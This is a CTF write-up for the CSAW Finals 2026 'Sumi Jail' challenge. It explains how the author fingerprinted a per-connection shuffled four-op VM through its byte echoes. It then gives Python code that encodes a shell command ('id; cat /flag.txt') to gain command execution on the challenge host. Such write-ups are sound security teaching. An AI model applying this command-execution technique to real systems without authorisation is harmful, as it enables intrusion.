---
title: "CSAW Finals 2026 — Sumi Jail: Fingerprinting a Shuffled 4-Op Machine"
date: "2026-11-13"
tags: ["csaw-finals-2026", "jail", "rce"]
excerpt: "A tiny VM with four operations randomly remapped to four keys every connection, and only two input lines. One injective diagnostic program recovered the mapping from its echoes; the second line built a shell command byte-by-byte."
---

> **CSAW CTF 2026 Finals · Jail · 500 pts**
> **Decoy:** `/flag.txt` = `csaw{congratulations_you_win}` — the real flag needed a further
> privesc step. This writeup covers the arbitrary-RCE primitive.

Sumi the cat is standing on four keys. Four keys, four operations, and the assignment
**shuffles every connection**. The machine (from `help`) has one accumulator `acc`, one
`buffer`, and four ops:

| op | effect |
|---|---|
| `inc` | `acc += 1` |
| `dbl` | `acc *= 2` |
| `dep` | `buffer += chr(acc & 0xFF); acc = 0` — and **echoes** the byte as `[0xNN]` |
| `exe` | run `buffer` as a shell command |

Keys `w/e/s/d` map to these four ops in a random permutation. You get exactly **two input
lines**; each is a full program. A VDF proof-of-work (200 modular square roots mod the
Mersenne prime `2^2203 − 1`) gates the connection.

## The idea: one op leaks, so fingerprint with it

Only `dep` produces observable output — the `[0xNN]` echo. So **line 1** is a fixed
diagnostic program chosen so its sequence of `dep`-echoes is **injective** over all 24
possible key→op permutations. `exe` doesn't change `acc`, so the echo sequence depends only
on `inc`/`dbl`/`dep`, making it robust. I precomputed the echoes for every permutation of the
diagnostic string `"seweedwdsdews"`; each permutation gives a unique echo tuple.

```python
DIAG = "seweedwdsdews"            # dep-echo sequence unique per mapping

def sim_echoes(line, perm):
    mp = dict(zip("wesd", perm)); acc = 0; ech = []
    for ch in line:
        o = mp[ch]
        if   o == "inc": acc += 1
        elif o == "dbl": acc *= 2
        elif o == "dep": ech.append(acc & 0xff); acc = 0
    return tuple(ech)
```

Send the diagnostic, read the observed `[0xNN]` echoes, and match against the precomputed
table — exactly one permutation survives, giving the full key→op mapping.

## Line 2: build the command byte-by-byte

With the mapping known, each byte of the shell command is built with double-and-add
(`dbl`/`inc` from the MSB) followed by `dep`, then a single `exe` at the end:

```python
def build_cmd(cmd, mp):
    inv = {v: k for k, v in mp.items()}
    seq = []
    for b in cmd.encode():
        for bit in bin(b)[2:]:
            seq.append(inv["dbl"])
            if bit == "1": seq.append(inv["inc"])
        seq.append(inv["dep"])
    seq.append(inv["exe"])
    return "".join(seq)
```

`build_cmd("id; cat /flag.txt", mp)` on line 2 ran as the `ctf` user.

## Lesson

When state is randomized per session but one operation is observable, you don't need to guess
— you *measure*. A single program whose output is injective over the whole key space turns an
unknown mapping into a one-shot fingerprint, and the rest is just arithmetic encoding of the
payload.
